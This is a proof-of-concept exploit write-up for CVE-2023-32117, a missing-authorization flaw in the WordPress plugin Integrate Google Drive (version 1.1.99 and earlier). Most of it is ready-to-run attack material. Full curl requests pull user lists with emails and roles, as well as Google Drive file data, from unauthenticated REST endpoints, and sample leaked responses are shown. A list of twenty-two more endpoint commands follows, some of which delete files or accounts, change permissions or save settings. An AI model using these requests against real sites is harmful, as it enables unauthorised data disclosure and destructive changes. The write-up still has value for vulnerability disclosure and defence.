# CVE-2023-32117
Integrate Google Drive &lt;= 1.1.99 - Missing Authorization via REST API Endpoints


POC
---

Get list of users and email adddress.

`curl -i -s -k -X $'POST' \
    -H $'Host: wordpress.lan' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 0' \
    $'http://wordpress.lan/wp-json/igd/v1/get-users-data'`


# Response
```{"success":true,"data":{"roles":{"administrator":1,"subscriber":4,"wdk_agent":3,"none":0},"total":9,"users":[{"id":1,"avatar":"<img alt='' src='http:\/\/0.gravatar.com\/avatar\/64e1b8d34f425d19e1ee2ea7236d3028?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/0.gravatar.com\/avatar\/64e1b8d34f425d19e1ee2ea7236d3028?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"admin","name":"admin","email":"admin@admin.com","role":"Administrator","folders":[]},{"id":2,"avatar":"<img alt='' src='http:\/\/2.gravatar.com\/avatar\/b58996c504c5638798eb6b511e6f49af?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/2.gravatar.com\/avatar\/b58996c504c5638798eb6b511e6f49af?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"user","name":"user name","email":"user@example.com","role":"Subscriber","folders":[]},{"id":3,"avatar":"<img alt='' src='http:\/\/1.gravatar.com\/avatar\/7f119498e0ed4df002f6676e1b8b1b07?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/1.gravatar.com\/avatar\/7f119498e0ed4df002f6676e1b8b1b07?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"Debra_Moran","name":"Debra Moran","email":"agent1@wpdirectorykit.com","role":"Agent","folders":[]},{"id":4,"avatar":"<img alt='' src='http:\/\/0.gravatar.com\/avatar\/fbc680fbc163811bea4e61ff43cccd59?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/0.gravatar.com\/avatar\/fbc680fbc163811bea4e61ff43cccd59?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"Garry_Novan","name":"Garry Novan","email":"agent2@wpdirectorykit.com","role":"Agent","folders":[]},{"id":5,"avatar":"<img alt='' src='http:\/\/0.gravatar.com\/avatar\/fedf00660c526608cd5c90df793148fb?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/0.gravatar.com\/avatar\/fedf00660c526608cd5c90df793148fb?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"Kety_Spear","name":"Kety Spear","email":"agent3@wpdirectorykit.com","role":"Agent","folders":[]},{"id":6,"avatar":"<img alt='' src='http:\/\/0.gravatar.com\/avatar\/08aa70e0d60620da43c4104af4b3390e?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/0.gravatar.com\/avatar\/08aa70e0d60620da43c4104af4b3390e?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"robbie","name":"robbie","email":"robbie@robbie.com","role":"Subscriber","folders":[]},{"id":7,"avatar":"<img alt='' src='http:\/\/0.gravatar.com\/avatar\/01f353506595eeba4df1a52b35bfdee1?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/0.gravatar.com\/avatar\/01f353506595eeba4df1a52b35bfdee1?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"tagent","name":"tagent","email":"tagent@info.com","role":"Subscriber","folders":[]},{"id":8,"avatar":"<img alt='' src='http:\/\/1.gravatar.com\/avatar\/4a0e0a5d4619c3564b0e60b2ae973ff8?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/1.gravatar.com\/avatar\/4a0e0a5d4619c3564b0e60b2ae973ff8?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"agent","name":"agent","email":"agent@info.com","role":"Subscriber","folders":[]},{"id":9,"avatar":"<img alt='' src='http:\/\/2.gravatar.com\/avatar\/b642b4217b34b1e8d3bd915fc65c4452?s=32&#038;d=mm&#038;r=g' srcset='http:\/\/2.gravatar.com\/avatar\/b642b4217b34b1e8d3bd915fc65c4452?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'\/>","username":"test","name":"test","email":"test@test.com","role":"None","folders":[]}]}}```

# Get Files

`curl -i -s -k -X $'POST' \
    -H $'Host: wordpress.lan' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 0' \
    $'http://wordpress.lan/wp-json/igd/v1/get-files'`

Response
--

```
{"success":true,"data":{"files":[{"id":"1Wv46uRrdKg7b8jt6xOhwRrFhEZkxhdAgv","name":"bf","type":"application\/vnd.google-apps.folder","size":null,"iconLink":"https:\/\/drive-thirdparty.googleusercontent.com\/16\/type\/application\/vnd.google-apps.folder","thumbnailLink":null,"webViewLink":"https:\/\/drive.google.com\/drive\/folders\/1Wv46uRrdKg7b8jt6xOhwRrFhEZkxhdAgv","webContentLink":null,"created":"2018-11-26T21:01:17.935Z","updated":"2018-11-26T21:01:17.935Z","description":null,"parents":["0AOC2xjBKqlYaUk9PVA"],"shared":false,"sharedWithMeTime":null,"extension":null,"resourceKey":null,"copyRequiresWriterPermission":false,"starred":false,"exportLinks":null,"accountId":"18028437231410161261","permissions":{"canEdit":false,"canPreview":true,"canDownload":true,"canDelete":true,"canTrash":true,"canMove":true,"canRename":true,"canShare":true,"copyRequiresWriterPermission":false,"canChangeCopyRequiresWriterPermission":false,"users":{"18098497999999999961":{"type":"user","role":"owner","domain":null}}},"owner":"Robbie (Random Robbie)","exportAs":[]},
```

Basically any POST request to the following endpoints.

```
curl -X POST http://wordpress.lan/wp-json/igd/v1/move-file
curl -X POST http://wordpress.lan/wp-json/igd/v1/rename
curl -X POST http://wordpress.lan/wp-json/igd/v1/copy
curl -X POST http://wordpress.lan/wp-json/igd/v1/import
curl -X POST http://wordpress.lan/wp-json/igd/v1/new-folder
curl -X POST http://wordpress.lan/wp-json/igd/v1/switch-account
curl -X POST http://wordpress.lan/wp-json/igd/v1/delete-account
curl -X POST http://wordpress.lan/wp-json/igd/v1/set-permission
curl -X POST http://wordpress.lan/wp-json/igd/v1/save-settings
curl -X POST http://wordpress.lan/wp-json/igd/v1/update-user-folders
curl -X POST http://wordpress.lan/wp-json/igd/v1/get-users-data
curl -X POST http://wordpress.lan/wp-json/igd/v1/update-shortcode
curl -X POST http://wordpress.lan/wp-json/igd/v1/duplicate-shortcode
curl -X POST http://wordpress.lan/wp-json/igd/v1/get-shortcode-content
curl -X POST http://wordpress.lan/wp-json/igd/v1/get-files
curl -X POST http://wordpress.lan/wp-json/igd/v1/get-folders
curl -X POST http://wordpress.lan/wp-json/igd/v1/get-embed-content
curl -X POST http://wordpress.lan/wp-json/igd/v1/delete-files
curl -X POST http://wordpress.lan/wp-json/igd/v1/create-doc
curl -X POST http://wordpress.lan/wp-json/igd/v1/export-data
curl -X POST http://wordpress.lan/wp-json/igd/v1/import-data
curl -X POST http://wordpress.lan/wp-json/igd/v1/file-uploaded
```
